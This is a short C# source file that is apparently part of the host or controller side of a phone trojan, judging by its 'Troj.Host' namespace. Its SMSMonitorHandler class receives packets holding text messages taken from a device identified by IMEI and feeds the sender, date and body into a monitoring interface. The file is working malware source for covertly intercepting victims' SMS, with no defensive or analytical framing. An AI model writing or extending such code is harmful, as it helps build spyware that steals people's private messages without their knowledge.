using InOut;
using InOut.PacketImp;

namespace IIE.Phone.Troj.Host.Handler
{
    public class SMSMonitorHandler : IPacketHandler
    {
        private readonly IMainView gui;
        private readonly int channel;
        private readonly string imei;

        public SMSMonitorHandler()
        {

        }

        public SMSMonitorHandler(int channel, string imei, IMainView gui)
        {
            this.gui = gui;
            this.channel = channel;
            this.imei = imei;
        }


        public void Receive(IPacket p, string tempIMEI)
        {

        }


        public void HandlePacket(IPacket p, string tempIMEI, Server c)
        {
            gui.Log.LogTxt("SMS data has been received");
            c.ChannelHandlerMap[imei].GetStorage(channel).Reset();
            var packet = (ShortSMSPacket)p;
            gui.AddMonitoredSMS(imei, packet.Address, packet.Date, packet.Body);
        }
    }
}
